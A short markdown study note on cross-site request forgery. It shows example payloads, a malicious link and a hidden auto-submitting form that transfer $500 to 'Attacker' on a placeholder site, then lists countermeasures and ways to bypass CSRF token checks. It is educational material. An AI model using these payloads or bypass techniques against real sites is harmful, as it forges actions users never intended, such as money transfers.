# Cross Site Request Forgery Vulnerability

CSRF is an attack vector that allows an attacker to get the users to perform actions that they do not intend to perform. 

### Get Request
`
<a href="http://site.com/send?to=Attacker&amount=$500">Click me!</a>
`
### Post Request
`<form action="http://site.com/send" method="POST">
	<input type="hidden" name="to" value="Attacker"/>
	<input type="hidden" name="amount" value="$500"/>
	<input type="submit" value="Click me"/>
</form>
`

To perform an automatic submit:

`<script>
	document.forms[0].submit();
</script>
`

![CSRF](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/csrf-cross-site-request-forgery.png)

***

## Countermeasures:

	- Implementing a CSRF token, This random token is unique for every session ID, it acts as an extra parameter when performing a request to make sure the origin of the request and verified by the server.
	- Generate random tokens for both Cookies and Request parameters.
	- Users should log off from website when they aren't in use, with disallowing the browser to save the credentials.

***

## Technique to bypass Token verifications: 

	- Removing the CSRF Token from the request, or leaving it empty.
	- Use a duplicated token from a previous request.
	- Check if you can predict the token generation mechanism.
	- Sending a random token

***

## Takeaways: 

	- Keep an eye for HTTP requests that perform some action on the server.
	- Get requests should never modify any data on the server.

